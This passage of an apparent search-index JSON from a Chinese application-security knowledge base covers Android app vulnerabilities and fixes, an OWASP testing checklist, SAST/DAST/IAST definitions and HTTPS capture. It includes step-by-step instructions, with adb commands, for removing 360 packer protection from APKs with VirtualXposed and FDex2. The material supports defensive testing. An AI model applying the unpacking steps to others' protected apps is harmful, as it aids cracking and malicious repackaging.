\u5efa\u8bae\uff1a\u4f7f\u7528ProGuard\u7b49\u5de5\u5177\u6df7\u6dc6\u4ee3\u7801\uff0c\u91cd\u8981\u903b\u8f91\u7528NDK\u5b9e\u73b0\u3002 \u4f8b\u5b50\uff1a\u53cd\u7f16\u8bd1\u91cd\u6253\u5305FlappyBird\uff0c\u628a\u5e7f\u544a\u5546ID\u6362\u4e86\uff0c\u6e38\u620f\u6539\u52a0\u63d2\u4e00\u6bb5\u6076\u610f\u4ee3\u7801\u7b49\u7b49\u3002","title":"\u53cd\u7f16\u8bd1"},{"location":"application-security/security-testing/app-security-testing/#_8","text":"\u6f0f\u6d1e\uff1a\u5916\u90e8\u5b58\u50a8\uff08SD\u5361\uff09\u4e0a\u7684\u6587\u4ef6\u6ca1\u6709\u6743\u9650\u7ba1\u7406\uff0c\u6240\u6709\u5e94\u7528\u90fd\u53ef\u8bfb\u53ef\u5199\u3002\u5f00\u53d1\u8005\u628a\u654f\u611f\u4fe1\u606f\u660e\u6587\u5b58\u5728SD\u5361\u4e0a\uff0c\u6216\u8005\u52a8\u6001\u52a0\u8f7d\u7684payload\u653e\u5728SD\u5361\u4e0a\u3002 \u5229\u7528\uff1a\u7a83\u53d6\u654f\u611f\u4fe1\u606f\uff0c\u7be1\u6539\u914d\u7f6e\u6587\u4ef6\uff0c\u4fee\u6539payload\u903b\u8f91\u5e76\u91cd\u6253\u5305\uff1b \u5efa\u8bae\uff1a\u4e0d\u8981\u628a\u654f\u611f\u4fe1\u606f\u653e\u5728\u5916\u90e8\u5b58\u50a8\u4e0a\u9762\uff1b\u5728\u52a8\u6001\u52a0\u8f7d\u5916\u90e8\u8d44\u6e90\u7684\u65f6\u5019\u9a8c\u8bc1\u6587\u4ef6\u5b8c\u6574\u6027\uff1b \u6f0f\u6d1e\uff1a\u4f7f\u7528\u5168\u5c40\u53ef\u8bfb\u5199\uff08MODE_WORLD_READABLE\uff0cMODE_WORLD_WRITEABLE\uff09\u7684\u5185\u90e8\u5b58\u50a8\u65b9\u5f0f\uff0c\u6216\u660e\u6587\u5b58\u50a8\u654f\u611f\u4fe1\u606f\uff08\u7528\u6237\u8d26\u53f7\u5bc6\u7801\u7b49\uff09\uff1b \u5229\u7528\uff1a\u5168\u5c40\u8bfb\u5199\u654f\u611f\u4fe1\u606f\uff0c\u6216 root \u540e\u8bfb\u53d6\u660e\u6587\u4fe1\u606f\uff1b \u5efa\u8bae\uff1a\u4e0d\u9002\u7528\u5168\u5c40\u53ef\u8bfb\u5199\u7684\u5185\u90e8\u5b58\u50a8\u65b9\u5f0f\uff0c\u4e0d\u660e\u6587\u5b58\u50a8\u7528\u6237\u8d26\u53f7\u5bc6\u7801\uff1b","title":"\u6570\u636e\u7684\u5b58\u50a8\u4e0e\u4f20\u8f93"},{"location":"application-security/security-testing/app-security-testing/#_9","text":"\u6f0f\u6d1e\uff1a\u5bc6\u7801\u660e\u6587\u5b58\u50a8\uff0c\u4f20\u8f93\uff1b \u5229\u7528\uff1a root \u540e\u53ef\u8bfb\u5199\u5185\u90e8\u5b58\u50a8\uff1b SD \u5361\u5168\u5c40\u53ef\u8bfb\u5199\uff1b \u516c\u5171 WiFi \u6293\u5305\u83b7\u53d6\u8d26\u53f7\u5bc6\u7801\uff1b \u5efa\u8bae\uff1a\u5b9e\u7528\u6210\u719f\u7684\u52a0\u5bc6\u65b9\u6848\u3002\u4e0d\u8981\u628a\u5bc6\u7801\u660e\u6587\u5b58\u50a8\u5728SD\u5361\u4e0a\uff1b","title":"\u5bc6\u7801\u6cc4\u6f0f"},{"location":"application-security/security-testing/app-security-testing/#webview","text":"\u6f0f\u6d1e\uff1a \u6076\u610fAPP\u53ef\u4ee5\u6ce8\u5165JavaScript\u4ee3\u7801\u8fdb\u5165WebView\u4e2d\u7684\u7f51\u9875\uff0c\u7f51\u9875\u672a\u4f5c\u9a8c\u8bc1\uff1b \u6076\u610f\u7f51\u9875\u53ef\u4ee5\u6267\u884cJavaScript\u53cd\u8fc7\u6765\u8c03\u7528App\u4e2d\u6ce8\u518c\u8fc7\u7684\u65b9\u6cd5\uff0c\u6216\u8005\u4f7f\u7528\u8d44\u6e90\uff1b \u5229\u7528\uff1a \u6076\u610f\u7a0b\u5e8f\u5d4c\u5165Web APP\uff0c\u7136\u540e\u7a83\u53d6\u7528\u6237\u4fe1\u606f\uff1b \u6076\u610f\u7f51\u9875\u8fdc\u7a0b\u8c03\u7528APP\u4ee3\u7801\u3002\u66f4\u6709\u751a\u8005\uff0c\u901a\u8fc7Java Reflection\u8c03\u7528Runtime\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002 \u5efa\u8bae\uff1a\u4e0d\u4f7f\u7528 WebView \u4e2d\u7684 setJavaScriptEnabled(true)\uff0c\u6216\u8005\u4f7f\u7528\u65f6\u5bf9\u8f93\u5165\u8fdb\u884c\u9a8c\u8bc1\u3002","title":"WebView"},{"location":"application-security/security-testing/app-security-testing/#_10","text":"ROOT\u540e\u7684\u624b\u673a\u53ef\u4ee5\u4fee\u6539APP\u7684\u5185\u8d2d\uff0c\u6216\u8005\u5b89\u88c5\u5916\u6302APP\u7b49\uff1b Logcat\u6cc4\u9732\u7528\u6237\u654f\u611f\u4fe1\u606f\uff1b \u6076\u610f\u7684\u5e7f\u544a\u5305\uff1b \u5229\u7528 next Intent\uff1b","title":"\u5176\u5b83\u6f0f\u6d1e"},{"location":"application-security/security-testing/checklist/","text":"\u5b89\u5168\u6d4b\u8bd5checklist OWASP CheckList \u4fe1\u606f\u6536\u96c6\u6d4b\u8bd5 \u641c\u7d22\u5f15\u64ce\u4fe1\u606f\u6536\u96c6 Web\u670d\u52a1\u5668\u6307\u7eb9\u8bc6\u522b Web\u670d\u52a1\u5668\u5143\u6587\u4ef6\u4fe1\u606f\u6cc4\u6f0f \u679a\u4e3eWeb\u670d\u52a1\u5668\u7684\u5e94\u7528 \u6ce8\u91ca\u548c\u5143\u6570\u636e\u4fe1\u606f\u6cc4\u6f0f \u8bc6\u522b\u5e94\u7528\u7684\u5165\u53e3 \u6620\u5c04\u5e94\u7528\u7a0b\u5e8f\u7684\u6267\u884c\u8def\u5f84 \u8bc6\u522bWeb\u5e94\u7528\u6846\u67b6 \u8bc6\u522bWeb\u5e94\u7528\u7a0b\u5e8f \u6620\u5c04\u5e94\u7528\u67b6\u6784 \u914d\u7f6e\u7ba1\u7406\u6d4b\u8bd5 \u5fd8\u4e86\u548c\u57fa\u7840\u8bbe\u65bd\u914d\u7f6e\u6d4b\u8bd5 \u5e94\u7528\u5e73\u53f0\u914d\u7f6e\u6d4b\u8bd5 \u654f\u611f\u4fe1\u606f\u6587\u4ef6\u6269\u5c55\u5904\u7406\u6d4b\u8bd5 \u5bf9\u65e7\u6587\u4ef6\u3001\u5907\u4efd\u548c\u672a\u88ab\u5f15\u7528\u6587\u4ef6\u7684\u654f\u611f\u4fe1\u606f\u7684\u5ba1\u67e5 \u679a\u4e3e\u57fa\u7840\u8bbe\u65bd\u548c\u5e94\u7528\u7a0b\u5e8f\u7ba1\u7406\u754c\u9762 HTTP\u65b9\u6cd5\u6d4b\u8bd5 HTTP\u5f3a\u5236\u5b89\u5168\u4f20\u8f93\u6d4b\u8bd5 RIA\u8de8\u57df\u7b56\u7565\u6d4b\u8bd5 \u8eab\u4efd\u7ba1\u7406\u6d4b\u8bd5 \u89d2\u8272\u5b9a\u4e49\u6d4b\u8bd5 \u7528\u6237\u6ce8\u518c\u6d41\u7a0b\u6d4b\u8bd5 \u8d26\u6237\u914d\u7f6e\u8fc7\u7a0b\u6d4b\u8bd5 \u8d26\u6237\u679a\u4e3e\u548c\u53ef\u731c\u6d4b\u7684\u7528\u6237\u8d26\u6237\u6d4b\u8bd5 \u5f31\u7684\u6216\u672a\u5b9e\u65bd\u7684\u7528\u6237\u7b56\u7565\u6d4b\u8bd5 \u8ba4\u8bc1\u6d4b\u8bd5 \u51ed\u8bc1\u5728\u52a0\u5bc6\u901a\u9053\u4e2d\u7684\u4f20\u8f93\u6d4b\u8bd5 \u9ed8\u8ba4\u7528\u6237\u51ed\u8bc1\u6d4b\u8bd5 \u5f31\u9501\u5b9a\u673a\u5236\u6d4b\u8bd5 \u8ba4\u8bc1\u6a21\u5f0f\u7ed5\u8fc7\u6d4b\u8bd5 \u8bb0\u5fc6\u5bc6\u7801\u529f\u80fd\u5b58\u5728\u5a01\u80c1\u6d4b\u8bd5 \u6d4f\u89c8\u5668\u7f13\u5b58\u5a01\u80c1\u6d4b\u8bd5 \u5f31\u5bc6\u7801\u7b56\u7565\u6d4b\u8bd5 \u5f31\u5b89\u5168\u95ee\u7b54\u6d4b\u8bd5 \u5f31\u5bc6\u7801\u7684\u66f4\u6539\u6216\u91cd\u8bbe\u529f\u80fd\u6d4b\u8bd5 \u5728\u8f85\u52a9\u4fe1\u9053\u4e2d\u8f83\u5f31\u8ba4\u8bc1\u6d4b\u8bd5 \u6388\u6743\u6d4b\u8bd5 \u76ee\u5f55\u904d\u5386/\u6587\u4ef6\u5305\u542b\u6d4b\u8bd5 \u7ed5\u8fc7\u6388\u6743\u6a21\u5f0f\u6d4b\u8bd5 \u6743\u9650\u63d0\u5347\u6d4b\u8bd5 \u4e0d\u5b89\u5168\u5bf9\u8c61\u5f15\u7528\u6d4b\u8bd5 \u4f1a\u8bdd\u7ba1\u7406\u6d4b\u8bd5 \u4f1a\u5f88\u7ba1\u7406\u67b6\u6784\u7ed5\u8fc7\u6d4b\u8bd5 Cookie\u5c5e\u6027\u6d4b\u8bd5 \u4f1a\u8bdd\u56fa\u5b9a\u6d4b\u8bd5 \u4f1a\u8bdd\u53d8\u91cf\u6cc4\u6f0f\u6d4b\u8bd5 \u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020CSRF\u6d4b\u8bd5 \u8f93\u5165\u9a8c\u8bc1\u6d4b\u8bd5 \u53cd\u5c04\u578b\u8de8\u7ad9\u811a\u672c\u6d4b\u8bd5 \u5b58\u50a8\u578b\u8de8\u7ad9\u811a\u672c\u6d4b\u8bd5 HTTP\u65b9\u6cd5\u7be1\u6539\u6d4b\u8bd5 HTTP\u53c2\u6570\u6c61\u67d3\u6d4b\u8bd5 SQL\u6ce8\u5165\u6d4b\u8bd5 LDAP\u6d4b\u8bd5 ORM\u6ce8\u5165\u6d4b\u8bd5 XML\u6ce8\u5165\u6d4b\u8bd5 SSI\u6ce8\u5165\u6d4b\u8bd5 XPath\u6ce8\u5165\u6d4b\u8bd5 IMAP/SMTP\u6ce8\u5165\u6d4b\u8bd5 \u4ee3\u7801\u6ce8\u5165\u6d4b\u8bd5 \u547d\u4ee4\u6ce8\u5165\u6d4b\u8bd5 \u7f13\u51b2\u533a\u6ea2\u51fa\u6d4b\u8bd5 \u6f5c\u4f0f\u5f0f\u6f0f\u6d1e\u6d4b\u8bd5 HTTP\u62c6\u5206/\u8d70\u79c1\u6d4b\u8bd5 \u9519\u8bef\u5904\u7406\u6d4b\u8bd5 \u62a5\u9519\u4fe1\u606f\u6d4b\u8bd5 \u5806\u6808\u8f68\u8ff9\u6d4b\u8bd5 \u52a0\u5bc6\u4f53\u7cfb\u8106\u5f31\u6027\u6d4b\u8bd5 SSL/TLS\u5f31\u52a0\u5bc6\u3001\u4f20\u8f93\u5c42\u534f\u8bae\u7f3a\u9677\u6d4b\u8bd5 Padding Oracle\u653b\u51fb\u6d4b\u8bd5 \u901a\u8fc7\u672a\u52a0\u5bc6\u4fe1\u9053\u53d1\u9001\u654f\u611f\u6570\u636e\u6d4b\u8bd5 \u4e1a\u52a1\u903b\u8f91\u6d4b\u8bd5 \u4e1a\u52a1\u903b\u8f91\u6570\u636e\u9a8c\u8bc1\u6d4b\u8bd5 \u4f2a\u9020\u8bf7\u6c42\u7684\u6d4b\u8bd5 \u5b8c\u6574\u6027\u68c0\u67e5\u7684\u6d4b\u8bd5 \u5904\u7406\u8017\u65f6\u6d4b\u8bd5 \u529f\u80fd\u4f7f\u7528\u6b21\u6570\u9650\u5236 \u5de5\u4f5c\u6d41\u7a0b\u9003\u9038\u7684\u6d4b\u8bd5 \u9632\u5fa1\u5e94\u7528\u7a0b\u5e8f\u6ee5\u7528\u6d4b\u8bd5 \u610f\u5916\u6587\u4ef6\u7c7b\u578b\u4e0a\u4f20\u6d4b\u8bd5 \u6076\u610f\u6587\u4ef6\u4e0a\u4f20\u6d4b\u8bd5 \u5ba2\u6237\u7aef\u6d4b\u8bd5 \u57fa\u4e8eDOM\u7684\u8de8\u7ad9\u811a\u672c\u6d4b\u8bd5 JavaScript\u6267\u884c\u6d4b\u8bd5 HTML\u6ce8\u5165\u6d4b\u8bd5 \u5ba2\u6237\u7aefURL\u91cd\u5b9a\u5411\u6d4b\u8bd5 CSS\u6ce8\u5165\u6d4b\u8bd5 \u5ba2\u6237\u7aef\u8d44\u6e90\u5904\u7406\u6d4b\u8bd5 \u8de8\u57df\u8d44\u6e90\u5171\u4eab\u6d4b\u8bd5 \u8de8\u7ad9Flash\u6d4b\u8bd5 \u70b9\u51fb\u52ab\u6301\u6d4b\u8bd5 WebSocket\u6d4b\u8bd5 Web\u6d88\u606f\u6d4b\u8bd5 \u672c\u5730\u5b58\u50a8\u6d4b\u8bd5 \u53c2\u8003\u8d44\u6599 security-checklist","title":"\u5b89\u5168\u6d4b\u8bd5checklist"},{"location":"application-security/security-testing/checklist/#checklist","text":"","title":"\u5b89\u5168\u6d4b\u8bd5checklist"},{"location":"application-security/security-testing/checklist/#owasp-checklist","text":"","title":"OWASP CheckList"},{"location":"application-security/security-testing/checklist/#_1","text":"\u641c\u7d22\u5f15\u64ce\u4fe1\u606f\u6536\u96c6 Web\u670d\u52a1\u5668\u6307\u7eb9\u8bc6\u522b Web\u670d\u52a1\u5668\u5143\u6587\u4ef6\u4fe1\u606f\u6cc4\u6f0f \u679a\u4e3eWeb\u670d\u52a1\u5668\u7684\u5e94\u7528 \u6ce8\u91ca\u548c\u5143\u6570\u636e\u4fe1\u606f\u6cc4\u6f0f \u8bc6\u522b\u5e94\u7528\u7684\u5165\u53e3 \u6620\u5c04\u5e94\u7528\u7a0b\u5e8f\u7684\u6267\u884c\u8def\u5f84 \u8bc6\u522bWeb\u5e94\u7528\u6846\u67b6 \u8bc6\u522bWeb\u5e94\u7528\u7a0b\u5e8f \u6620\u5c04\u5e94\u7528\u67b6\u6784","title":"\u4fe1\u606f\u6536\u96c6\u6d4b\u8bd5"},{"location":"application-security/security-testing/checklist/#_2","text":"\u5fd8\u4e86\u548c\u57fa\u7840\u8bbe\u65bd\u914d\u7f6e\u6d4b\u8bd5 \u5e94\u7528\u5e73\u53f0\u914d\u7f6e\u6d4b\u8bd5 \u654f\u611f\u4fe1\u606f\u6587\u4ef6\u6269\u5c55\u5904\u7406\u6d4b\u8bd5 \u5bf9\u65e7\u6587\u4ef6\u3001\u5907\u4efd\u548c\u672a\u88ab\u5f15\u7528\u6587\u4ef6\u7684\u654f\u611f\u4fe1\u606f\u7684\u5ba1\u67e5 \u679a\u4e3e\u57fa\u7840\u8bbe\u65bd\u548c\u5e94\u7528\u7a0b\u5e8f\u7ba1\u7406\u754c\u9762 HTTP\u65b9\u6cd5\u6d4b\u8bd5 HTTP\u5f3a\u5236\u5b89\u5168\u4f20\u8f93\u6d4b\u8bd5 RIA\u8de8\u57df\u7b56\u7565\u6d4b\u8bd5","title":"\u914d\u7f6e\u7ba1\u7406\u6d4b\u8bd5"},{"location":"application-security/security-testing/checklist/#_3","text":"\u89d2\u8272\u5b9a\u4e49\u6d4b\u8bd5 \u7528\u6237\u6ce8\u518c\u6d41\u7a0b\u6d4b\u8bd5 \u8d26\u6237\u914d\u7f6e\u8fc7\u7a0b\u6d4b\u8bd5 \u8d26\u6237\u679a\u4e3e\u548c\u53ef\u731c\u6d4b\u7684\u7528\u6237\u8d26\u6237\u6d4b\u8bd5 \u5f31\u7684\u6216\u672a\u5b9e\u65bd\u7684\u7528\u6237\u7b56\u7565\u6d4b\u8bd5","title":"\u8eab\u4efd\u7ba1\u7406\u6d4b\u8bd5"},{"location":"application-security/security-testing/checklist/#_4","text":"\u51ed\u8bc1\u5728\u52a0\u5bc6\u901a\u9053\u4e2d\u7684\u4f20\u8f93\u6d4b\u8bd5 \u9ed8\u8ba4\u7528\u6237\u51ed\u8bc1\u6d4b\u8bd5 \u5f31\u9501\u5b9a\u673a\u5236\u6d4b\u8bd5 \u8ba4\u8bc1\u6a21\u5f0f\u7ed5\u8fc7\u6d4b\u8bd5 \u8bb0\u5fc6\u5bc6\u7801\u529f\u80fd\u5b58\u5728\u5a01\u80c1\u6d4b\u8bd5 \u6d4f\u89c8\u5668\u7f13\u5b58\u5a01\u80c1\u6d4b\u8bd5 \u5f31\u5bc6\u7801\u7b56\u7565\u6d4b\u8bd5 \u5f31\u5b89\u5168\u95ee\u7b54\u6d4b\u8bd5 \u5f31\u5bc6\u7801\u7684\u66f4\u6539\u6216\u91cd\u8bbe\u529f\u80fd\u6d4b\u8bd5 \u5728\u8f85\u52a9\u4fe1\u9053\u4e2d\u8f83\u5f31\u8ba4\u8bc1\u6d4b\u8bd5","title":"\u8ba4\u8bc1\u6d4b\u8bd5"},{"location":"application-security/security-testing/checklist/#_5","text":"\u76ee\u5f55\u904d\u5386/\u6587\u4ef6\u5305\u542b\u6d4b\u8bd5 \u7ed5\u8fc7\u6388\u6743\u6a21\u5f0f\u6d4b\u8bd5 \u6743\u9650\u63d0\u5347\u6d4b\u8bd5 \u4e0d\u5b89\u5168\u5bf9\u8c61\u5f15\u7528\u6d4b\u8bd5","title":"\u6388\u6743\u6d4b\u8bd5"},{"location":"application-security/security-testing/checklist/#_6","text":"\u4f1a\u5f88\u7ba1\u7406\u67b6\u6784\u7ed5\u8fc7\u6d4b\u8bd5 Cookie\u5c5e\u6027\u6d4b\u8bd5 \u4f1a\u8bdd\u56fa\u5b9a\u6d4b\u8bd5 \u4f1a\u8bdd\u53d8\u91cf\u6cc4\u6f0f\u6d4b\u8bd5 \u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020CSRF\u6d4b\u8bd5","title":"\u4f1a\u8bdd\u7ba1\u7406\u6d4b\u8bd5"},{"location":"application-security/security-testing/checklist/#_7","text":"\u53cd\u5c04\u578b\u8de8\u7ad9\u811a\u672c\u6d4b\u8bd5 \u5b58\u50a8\u578b\u8de8\u7ad9\u811a\u672c\u6d4b\u8bd5 HTTP\u65b9\u6cd5\u7be1\u6539\u6d4b\u8bd5 HTTP\u53c2\u6570\u6c61\u67d3\u6d4b\u8bd5 SQL\u6ce8\u5165\u6d4b\u8bd5 LDAP\u6d4b\u8bd5 ORM\u6ce8\u5165\u6d4b\u8bd5 XML\u6ce8\u5165\u6d4b\u8bd5 SSI\u6ce8\u5165\u6d4b\u8bd5 XPath\u6ce8\u5165\u6d4b\u8bd5 IMAP/SMTP\u6ce8\u5165\u6d4b\u8bd5 \u4ee3\u7801\u6ce8\u5165\u6d4b\u8bd5 \u547d\u4ee4\u6ce8\u5165\u6d4b\u8bd5 \u7f13\u51b2\u533a\u6ea2\u51fa\u6d4b\u8bd5 \u6f5c\u4f0f\u5f0f\u6f0f\u6d1e\u6d4b\u8bd5 HTTP\u62c6\u5206/\u8d70\u79c1\u6d4b\u8bd5","title":"\u8f93\u5165\u9a8c\u8bc1\u6d4b\u8bd5"},{"location":"application-security/security-testing/checklist/#_8","text":"\u62a5\u9519\u4fe1\u606f\u6d4b\u8bd5 \u5806\u6808\u8f68\u8ff9\u6d4b\u8bd5","title":"\u9519\u8bef\u5904\u7406\u6d4b\u8bd5"},{"location":"application-security/security-testing/checklist/#_9","text":"SSL/TLS\u5f31\u52a0\u5bc6\u3001\u4f20\u8f93\u5c42\u534f\u8bae\u7f3a\u9677\u6d4b\u8bd5 Padding Oracle\u653b\u51fb\u6d4b\u8bd5 \u901a\u8fc7\u672a\u52a0\u5bc6\u4fe1\u9053\u53d1\u9001\u654f\u611f\u6570\u636e\u6d4b\u8bd5","title":"\u52a0\u5bc6\u4f53\u7cfb\u8106\u5f31\u6027\u6d4b\u8bd5"},{"location":"application-security/security-testing/checklist/#_10","text":"\u4e1a\u52a1\u903b\u8f91\u6570\u636e\u9a8c\u8bc1\u6d4b\u8bd5 \u4f2a\u9020\u8bf7\u6c42\u7684\u6d4b\u8bd5 \u5b8c\u6574\u6027\u68c0\u67e5\u7684\u6d4b\u8bd5 \u5904\u7406\u8017\u65f6\u6d4b\u8bd5 \u529f\u80fd\u4f7f\u7528\u6b21\u6570\u9650\u5236 \u5de5\u4f5c\u6d41\u7a0b\u9003\u9038\u7684\u6d4b\u8bd5 \u9632\u5fa1\u5e94\u7528\u7a0b\u5e8f\u6ee5\u7528\u6d4b\u8bd5 \u610f\u5916\u6587\u4ef6\u7c7b\u578b\u4e0a\u4f20\u6d4b\u8bd5 \u6076\u610f\u6587\u4ef6\u4e0a\u4f20\u6d4b\u8bd5","title":"\u4e1a\u52a1\u903b\u8f91\u6d4b\u8bd5"},{"location":"application-security/security-testing/checklist/#_11","text":"\u57fa\u4e8eDOM\u7684\u8de8\u7ad9\u811a\u672c\u6d4b\u8bd5 JavaScript\u6267\u884c\u6d4b\u8bd5 HTML\u6ce8\u5165\u6d4b\u8bd5 \u5ba2\u6237\u7aefURL\u91cd\u5b9a\u5411\u6d4b\u8bd5 CSS\u6ce8\u5165\u6d4b\u8bd5 \u5ba2\u6237\u7aef\u8d44\u6e90\u5904\u7406\u6d4b\u8bd5 \u8de8\u57df\u8d44\u6e90\u5171\u4eab\u6d4b\u8bd5 \u8de8\u7ad9Flash\u6d4b\u8bd5 \u70b9\u51fb\u52ab\u6301\u6d4b\u8bd5 WebSocket\u6d4b\u8bd5 Web\u6d88\u606f\u6d4b\u8bd5 \u672c\u5730\u5b58\u50a8\u6d4b\u8bd5","title":"\u5ba2\u6237\u7aef\u6d4b\u8bd5"},{"location":"application-security/security-testing/checklist/#_12","text":"security-checklist","title":"\u53c2\u8003\u8d44\u6599"},{"location":"application-security/security-testing/dast-iast-sast/","text":"DAST SAST IAST SAST\uff1a\u9759\u6001\u5e94\u7528\u5b89\u5168\u6d4b\u8bd5\uff0c\u68c0\u67e5\u5e94\u7528\u7684\u6e90\u4ee3\u7801\u4ee5\u6307\u51fa\u53ef\u80fd\u7684\u5b89\u5168\u7f3a\u9677\uff0c\u4e5f\u88ab\u79f0\u4e3a\u767d\u76d2\u6d4b\u8bd5\uff1b DAST\uff1a\u52a8\u6001\u5e94\u7528\u5b89\u5168\u6d4b\u8bd5\uff0c\u5728\u5e94\u7528\u7684\u8fd0\u884c\u72b6\u6001\u4e2d\u6d4b\u8bd5\u5e94\u7528\uff0c\u4e5f\u88ab\u79f0\u4e3a\u9ed1\u76d2\u6d4b\u8bd5\uff1b IAST\uff1a\u4ea4\u4e92\u5e94\u7528\u5b89\u5168\u6d4b\u8bd5\uff0c\u4e0eWebServer\u96c6\u6210\uff0c\u57fa\u4e8e\u6269\u5c55\u83b7\u53d6\u5230\u7684\u6570\u636e\u8fdb\u884c\u6d4b\u8bd5\uff1b SAST vs DAST vs IAST SAST DAST IAST \u767d\u76d2\u5b89\u5168\u6d4b\u8bd5 \u9ed1\u76d2\u5b89\u5168\u6d4b\u8bd5 \u9700\u8981\u6e90\u4ee3\u7801 \u9700\u8981\u4e00\u4e2a\u8fd0\u884c\u73af\u5883 \u53c2\u8003\u8d44\u6599 \u8c08\u8c08SAST/IDAST/IAST SAST vs. DAST: What\u2019s the best method for application security testing?","title":"DAST&SAST&IAST"},{"location":"application-security/security-testing/dast-iast-sast/#dastsastiast","text":"SAST\uff1a\u9759\u6001\u5e94\u7528\u5b89\u5168\u6d4b\u8bd5\uff0c\u68c0\u67e5\u5e94\u7528\u7684\u6e90\u4ee3\u7801\u4ee5\u6307\u51fa\u53ef\u80fd\u7684\u5b89\u5168\u7f3a\u9677\uff0c\u4e5f\u88ab\u79f0\u4e3a\u767d\u76d2\u6d4b\u8bd5\uff1b DAST\uff1a\u52a8\u6001\u5e94\u7528\u5b89\u5168\u6d4b\u8bd5\uff0c\u5728\u5e94\u7528\u7684\u8fd0\u884c\u72b6\u6001\u4e2d\u6d4b\u8bd5\u5e94\u7528\uff0c\u4e5f\u88ab\u79f0\u4e3a\u9ed1\u76d2\u6d4b\u8bd5\uff1b IAST\uff1a\u4ea4\u4e92\u5e94\u7528\u5b89\u5168\u6d4b\u8bd5\uff0c\u4e0eWebServer\u96c6\u6210\uff0c\u57fa\u4e8e\u6269\u5c55\u83b7\u53d6\u5230\u7684\u6570\u636e\u8fdb\u884c\u6d4b\u8bd5\uff1b","title":"DAST&amp;SAST&amp;IAST"},{"location":"application-security/security-testing/dast-iast-sast/#sast-vs-dast-vs-iast","text":"SAST DAST IAST \u767d\u76d2\u5b89\u5168\u6d4b\u8bd5 \u9ed1\u76d2\u5b89\u5168\u6d4b\u8bd5 \u9700\u8981\u6e90\u4ee3\u7801 \u9700\u8981\u4e00\u4e2a\u8fd0\u884c\u73af\u5883","title":"SAST vs DAST vs IAST"},{"location":"application-security/security-testing/dast-iast-sast/#_1","text":"\u8c08\u8c08SAST/IDAST/IAST SAST vs. DAST: What\u2019s the best method for application security testing?","title":"\u53c2\u8003\u8d44\u6599"},{"location":"application-security/security-testing/tools-skills/app/","text":"APP\u8131\u58f3\u6280\u5de7 \u5229\u7528FDex2\u8131360 \u73af\u5883\uff1aGoogle Nesus 7\uff08\u6a21\u62df\u5668\uff09Android 5.1 \u5b89\u88c5VirtualXposed\uff0c \u4e0b\u8f7d\u5730\u5740 \u4e0b\u8f7dFDex2\u5e76\u5b89\u88c5\u5728\u6a21\u62df\u5668\u4e0a\uff0c \u4e0b\u8f7d\u5730\u5740 \u5bc6\u7801\uff1adk4v \u540c\u65f6\u5b89\u88c5\u9700\u8981\u8131\u58f3\u7684\u5e94\u7528\u5728\u6a21\u62df\u5668\u4e0a \u542f\u52a8VirtualXposed\uff0c\u70b9\u51fbAdd APP\u5b89\u88c5FDex2\uff0c\u4ee5\u53ca\u4f60\u9700\u8981\u7834\u89e3\u7684\u5305 \u6fc0\u6d3bFDex2\uff0c\u70b9\u51fbManage Xposed Module\uff0c\u52fe\u9009FDex2 adb install VirtualXposed_0.16.0.apk adb install FDex2_1.1.apk adb install *.apk \u7136\u540e\u5728VirtualXposed\u6253\u5f00FDex2\uff0c\u5bf9\u9700\u8981\u8131\u58f3\u7684\u5e94\u7528\u8fdb\u884c\u8131\u58f3\u5373\u53ef\uff1b \u53c2\u8003\u8d44\u6599 \u79fb\u52a8APP\u6f0f\u6d1e\u81ea\u52a8\u5316\u68c0\u6d4b\u5e73\u53f0\u5efa\u8bbe \u6253\u9020\u81ea\u5df1\u7684Android\u5b89\u5168\u6d4b\u8bd5\u73af\u5883 Android APK\u8131\u58f3--\u817e\u8baf\u4e50\u56fa\u3001360\u52a0\u56fa\u4e00\u952e\u8131\u58f3","title":"APP\u8131\u58f3\u6280\u5de7"},{"location":"application-security/security-testing/tools-skills/app/#app","text":"","title":"APP\u8131\u58f3\u6280\u5de7"},{"location":"application-security/security-testing/tools-skills/app/#fdex2360","text":"\u73af\u5883\uff1aGoogle Nesus 7\uff08\u6a21\u62df\u5668\uff09Android 5.1 \u5b89\u88c5VirtualXposed\uff0c \u4e0b\u8f7d\u5730\u5740 \u4e0b\u8f7dFDex2\u5e76\u5b89\u88c5\u5728\u6a21\u62df\u5668\u4e0a\uff0c \u4e0b\u8f7d\u5730\u5740 \u5bc6\u7801\uff1adk4v \u540c\u65f6\u5b89\u88c5\u9700\u8981\u8131\u58f3\u7684\u5e94\u7528\u5728\u6a21\u62df\u5668\u4e0a \u542f\u52a8VirtualXposed\uff0c\u70b9\u51fbAdd APP\u5b89\u88c5FDex2\uff0c\u4ee5\u53ca\u4f60\u9700\u8981\u7834\u89e3\u7684\u5305 \u6fc0\u6d3bFDex2\uff0c\u70b9\u51fbManage Xposed Module\uff0c\u52fe\u9009FDex2 adb install VirtualXposed_0.16.0.apk adb install FDex2_1.1.apk adb install *.apk \u7136\u540e\u5728VirtualXposed\u6253\u5f00FDex2\uff0c\u5bf9\u9700\u8981\u8131\u58f3\u7684\u5e94\u7528\u8fdb\u884c\u8131\u58f3\u5373\u53ef\uff1b","title":"\u5229\u7528FDex2\u8131360"},{"location":"application-security/security-testing/tools-skills/app/#_1","text":"\u79fb\u52a8APP\u6f0f\u6d1e\u81ea\u52a8\u5316\u68c0\u6d4b\u5e73\u53f0\u5efa\u8bbe \u6253\u9020\u81ea\u5df1\u7684Android\u5b89\u5168\u6d4b\u8bd5\u73af\u5883 Android APK\u8131\u58f3--\u817e\u8baf\u4e50\u56fa\u3001360\u52a0\u56fa\u4e00\u952e\u8131\u58f3","title":"\u53c2\u8003\u8d44\u6599"},{"location":"application-security/security-testing/tools-skills/capture-https/","text":"https\u6293\u5305 \u5e38\u7528\u6293\u5305\u5de5\u5177 burpsuite fiddler charles https\u5355\u5411\u8ba4\u8bc1\u4e0e\u53cc\u5411\u8ba4\u8bc1 \u5982\u4f55\u6293\u53d6https\u7684\u5305 \u63a5\u53d7\u6240\u6709\u8bc1\u4e66\u7684app \u4e0d\u5bf9\u8bc1\u4e66\u505a\u4e25\u91cd\uff0c\u76f4\u63a5\u901a\u8fc7\u4ee3\u7406\u5c31\u53ef\u4ee5\u6293\u5305\uff1b \u4f7f\u7528\u7cfb\u7edf\u8bc1\u4e66\u8fdb\u884c\u6821\u9a8c\u7684app \u5c06\u4ee3\u7406\u5de5\u5177\u7684\u8bc1\u4e66\u5bfc\u51fa\u4e3acer\u683c\u5f0f\uff1b 